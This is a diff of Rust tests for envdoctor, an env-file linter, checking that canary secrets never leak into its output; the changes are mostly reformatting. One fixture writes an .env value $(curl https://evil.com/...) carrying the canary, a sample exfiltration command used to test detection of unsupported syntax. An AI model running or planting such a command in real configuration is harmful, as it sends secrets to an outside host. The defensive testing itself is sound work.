@@ -72,9 +72,21 @@ fn assert_zero_canary_leakage(output: &std::process::Output) {
 #[test]
 fn test_canary_valid_assignments() {
     let ws = TempWorkspace::new("canary_valid");
-    let contract = ws.write_file(".env.example", "AUTH_TOKEN=placeholder\nDATABASE_URL=postgres://localhost\n");
-    let env_file = ws.write_file(".env", &format!("AUTH_TOKEN={}\nDATABASE_URL=postgres://user:{}@localhost/db\n", CANARY, CANARY));
-    ws.write_file("src/index.ts", "const t = process.env.AUTH_TOKEN;\nconst db = process.env.DATABASE_URL;\n");
+    let contract = ws.write_file(
+        ".env.example",
+        "AUTH_TOKEN=placeholder\nDATABASE_URL=postgres://localhost\n",
+    );
+    let env_file = ws.write_file(
+        ".env",
+        &format!(
+            "AUTH_TOKEN={}\nDATABASE_URL=postgres://user:{}@localhost/db\n",
+            CANARY, CANARY
+        ),
+    );
+    ws.write_file(
+        "src/index.ts",
+        "const t = process.env.AUTH_TOKEN;\nconst db = process.env.DATABASE_URL;\n",
+    );
 
     // 1. Human output format
     let out_human = Command::new(bin_path())
@@ -111,7 +123,13 @@ fn test_canary_valid_assignments() {
 fn test_canary_malformed_syntax_env005() {
     let ws = TempWorkspace::new("canary_malformed");
     let contract = ws.write_file(".env.example", "PORT=3000\n");
-    let env_file = ws.write_file(".env", &format!("PORT=3000\nTHIS_LINE_IS_MALFORMED_WITHOUT_EQUALS_{}\nANOTHER_BAD = foo bar baz {}\n", CANARY, CANARY));
+    let env_file = ws.write_file(
+        ".env",
+        &format!(
+            "PORT=3000\nTHIS_LINE_IS_MALFORMED_WITHOUT_EQUALS_{}\nANOTHER_BAD = foo bar baz {}\n",
+            CANARY, CANARY
+        ),
+    );
     ws.write_file("src/app.ts", "console.log(process.env.PORT);");
 
     let output = Command::new(bin_path())
@@ -135,8 +153,17 @@ fn test_canary_malformed_syntax_env005() {
 fn test_canary_unsupported_syntax_env006() {
     let ws = TempWorkspace::new("canary_unsupported");
     let contract = ws.write_file(".env.example", "TOKEN=val\nDYNAMIC=subshell\n");
-    let env_file = ws.write_file(".env", &format!("TOKEN=\"hello ${{ENV_{}}}\"\nDYNAMIC=$(curl https://evil.com/{})\n", CANARY, CANARY));
-    ws.write_file("src/app.ts", "console.log(process.env.TOKEN);\nconsole.log(process.env.DYNAMIC);");
+    let env_file = ws.write_file(
+        ".env",
+        &format!(
+            "TOKEN=\"hello ${{ENV_{}}}\"\nDYNAMIC=$(curl https://evil.com/{})\n",
+            CANARY, CANARY
+        ),
+    );
+    ws.write_file(
+        "src/app.ts",
+        "console.log(process.env.TOKEN);\nconsole.log(process.env.DYNAMIC);",
+    );
 
     let output = Command::new(bin_path())
         .arg("--contract")
@@ -159,7 +186,10 @@ fn test_canary_unsupported_syntax_env006() {
 fn test_canary_dynamic_bracket_access_and_aliasing_env010_env012() {
     let ws = TempWorkspace::new("canary_dynamic");
     let contract = ws.write_file(".env.example", "STATIC_VAR=default\n");
-    let env_file = ws.write_file(".env", &format!("STATIC_VAR={}\nSECRET_KEY={}\n", CANARY, CANARY));
+    let env_file = ws.write_file(
+        ".env",
+        &format!("STATIC_VAR={}\nSECRET_KEY={}\n", CANARY, CANARY),
+    );
     ws.write_file(
         "src/app.ts",
         r#"
@@ -167,7 +197,7 @@ fn test_canary_dynamic_bracket_access_and_aliasing_env010_env012() {
         const dynamicProp = "SOMETHING";
         const val = process.env[dynamicProp]; // ENV010
         const copiedEnv = { ...process.env }; // ENV012
-        "#
+        "#,
     );
 
     let output = Command::new(bin_path())
@@ -195,13 +225,10 @@ fn test_canary_empty_required_value_and_missing_env003_env007() {
         ".env.example",
         "REQUIRED_EMPTY=must_not_be_empty\nREQUIRED_MISSING=must_be_present\nCANARY_VAR=placeholder\n"
     );
-    let env_file = ws.write_file(
-        ".env",
-        &format!("REQUIRED_EMPTY=\nCANARY_VAR={}\n", CANARY)
-    );
+    let env_file = ws.write_file(".env", &format!("REQUIRED_EMPTY=\nCANARY_VAR={}\n", CANARY));
     ws.write_file(
         "src/app.ts",
-        "console.log(process.env.REQUIRED_EMPTY);\nconsole.log(process.env.CANARY_VAR);\n"
+        "console.log(process.env.REQUIRED_EMPTY);\nconsole.log(process.env.CANARY_VAR);\n",
     );
 
     let output = Command::new(bin_path())
@@ -224,10 +251,10 @@ fn test_canary_empty_required_value_and_missing_env003_env007() {
 
 #[test]
 fn test_canary_panic_and_debug_representation_safety() {
-    use envdoctor::redaction::RawEnvValue;
     use envdoctor::model::definition::Definition;
     use envdoctor::model::span::Span;
     use envdoctor::model::value::ValueKind;
+    use envdoctor::redaction::RawEnvValue;
 
     // Test that RawEnvValue converts to ValueKind without keeping canary in memory
     let raw = RawEnvValue::new(CANARY, false);
